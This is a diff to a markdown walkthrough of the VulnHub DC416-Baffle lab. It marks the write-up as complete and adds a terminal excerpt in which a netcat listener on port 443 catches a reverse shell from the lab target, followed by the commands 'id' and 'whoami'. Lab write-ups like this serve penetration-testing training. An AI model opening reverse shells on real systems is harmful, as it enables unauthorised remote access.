@@ -1,4 +1,4 @@
-# DC416-Baffle (not complete yet)
+# DC416-Baffle
 [Link to vulnhub](https://www.vulnhub.com/entry/dc416-2016,168/)
 
 ## Reconnaissance
@@ -927,6 +927,11 @@ Socket fd: 16354
 ```
 
 ```
+root@AIRBUS:~# nc -lnvp 443
+listening on [any] 443 ...
+connect to [192.168.159.4] from (UNKNOWN) [192.168.159.133] 54304
+id
+uid=1000(vulnhub) gid=1000(vulnhub) groups=1000(vulnhub),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),108(netdev)
 whoami
 vulnhub
 dir
